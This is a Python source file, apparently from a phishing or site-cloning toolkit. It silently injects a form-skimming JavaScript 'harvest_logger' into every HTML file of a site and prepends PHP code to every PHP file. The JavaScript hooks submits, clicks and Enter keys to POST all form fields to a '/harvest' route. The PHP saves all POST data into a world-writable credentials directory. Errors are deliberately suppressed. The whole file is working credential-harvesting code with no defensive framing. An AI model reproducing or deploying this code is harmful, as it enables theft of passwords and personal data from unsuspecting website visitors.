import os

def inject_logger_to_all_html(site_dir):
    """
    Inject a robust JavaScript logger into ALL HTML files (recursively, only once per file, and safely).
    """
    HARVEST_ROUTE = "/harvest"
    INJECTION_SCRIPT = f"""
<!-- harvest_logger -->
<script>
(function() {{
    if(window.__harvest_logger_loaded) return;
    window.__harvest_logger_loaded = true;
    function formToDict(form) {{
        var data = {{}};
        var fd = new FormData(form);
        fd.forEach(function(value, key) {{
            data[key] = value;
        }});
        // If FormData is empty, manually gather all input/select/textarea
        if(Object.keys(data).length === 0) {{
            var idx = 0;
            var els = form.querySelectorAll('input,select,textarea');
            els.forEach(function(el) {{
                var k = el.name || el.id || ('field_'+idx++);
                var v = el.value;
                data[k] = v;
            }});
        }}
        return data;
    }}
    function sendHarvest(form) {{
        try {{
            var data = formToDict(form);
            fetch('{HARVEST_ROUTE}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }}).catch(function(){{}});
        }}catch(e){{}}
    }}
    var origSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {{
        sendHarvest(this);
        origSubmit.apply(this, arguments);
    }};
    document.addEventListener('submit', function(e){{
        sendHarvest(e.target);
    }}, true);
    function hookBtns(form){{
        var btns = form.querySelectorAll('[type=submit],button');
        btns.forEach(function(btn){{
            btn.addEventListener('click', function(){{sendHarvest(form);}}, true);
        }});
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input){{
            input.addEventListener('keydown', function(e){{
                if(e.key==='Enter'){{sendHarvest(form);}}
            }}, true);
        }});
    }}
    document.querySelectorAll('form').forEach(hookBtns);
    var mo = new MutationObserver(function(muts){{
        muts.forEach(function(mut){{
            mut.addedNodes.forEach(function(node){{
                if(node.tagName==='FORM') hookBtns(node);
                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
            }});
        }});
    }});
    mo.observe(document.documentElement,{{childList:true,subtree:true}});
}})();
</script>
"""
    for root, _, files in os.walk(site_dir):
        for file in files:
            if file.lower().endswith('.html'):
                html_file = os.path.join(root, file)
                try:
                    with open(html_file, "r", encoding="utf-8") as f:
                        content = f.read()
                    # Only inject if not already present
                    if "harvest_logger" in content:
                        continue

                    # Inject ONLY ONCE: after <head>, or else before </body>, or else at end
                    if "<head>" in content:
                        new_content = content.replace(
                            "<head>", "<head>" + INJECTION_SCRIPT, 1
                        )
                    elif "<head " in content:  # handle <head ...>
                        idx = content.find("<head ")
                        idx2 = content.find(">", idx)
                        if idx2 != -1:
                            new_content = content[:idx2+1] + INJECTION_SCRIPT + content[idx2+1:]
                        else:
                            new_content = content + INJECTION_SCRIPT
                    elif "</body>" in content:
                        new_content = content.replace(
                            "</body>", INJECTION_SCRIPT + "\n</body>", 1
                        )
                    else:
                        new_content = content + INJECTION_SCRIPT

                    # Backup original only if no backup exists
                    backup = html_file + ".bak"
                    if not os.path.exists(backup):
                        with open(backup, "w", encoding="utf-8") as f:
                            f.write(content)
                    with open(html_file, "w", encoding="utf-8") as f:
                        f.write(new_content)
                except Exception:
                    pass  # Fully silent

def inject_logger_to_php(site_dir, site_name, credentials_dir):
    """
    Injects PHP logging code into all PHP files in the site (if not already injected).
    """
    try:
        dir_path = os.path.join(credentials_dir, site_name).replace('\\', '/')
        logger_code = f"""
<?php // harvest_logger
if ($_SERVER["REQUEST_METHOD"] == "POST") {{
    $raw_data = file_get_contents('php://input');
    parse_str($raw_data, $data);
    $dir = "{dir_path}";
    @mkdir($dir, 0777, true);
    @chmod($dir, 0777);
    $file = $dir . "/result.json";
    $log = [];
    if (file_exists($file)) {{
        $log = json_decode(file_get_contents($file), true);
        if (!is_array($log)) $log = [];
    }}
    $log[] = [
        "timestamp" => date("Y-m-d H:i:s"),
        "data" => $data
    ];
    file_put_contents($file, json_encode($log, JSON_PRETTY_PRINT));
}}
?>
"""
        for root, _, files in os.walk(site_dir):
            for file in files:
                if file.lower().endswith(".php") and not file.endswith('.bak'):
                    php_file = os.path.join(root, file)
                    try:
                        with open(php_file, "r", encoding="utf-8") as f:
                            content = f.read()
                        if "harvest_logger" in content:
                            continue
                        # If file starts with <?php, inject after first ?>
                        if content.lstrip().startswith("<?php"):
                            parts = content.split("?>", 1)
                            new_content = parts[0] + "?>\n" + logger_code + (parts[1] if len(parts) > 1 else "")
                        else:
                            new_content = logger_code + content
                        backup = php_file + ".bak"
                        if not os.path.exists(backup):
                            with open(backup, "w", encoding="utf-8") as f:
                                f.write(content)
                        with open(php_file, "w", encoding="utf-8") as f:
                            f.write(new_content)
                    except Exception:
                        pass
    except Exception:
        pass
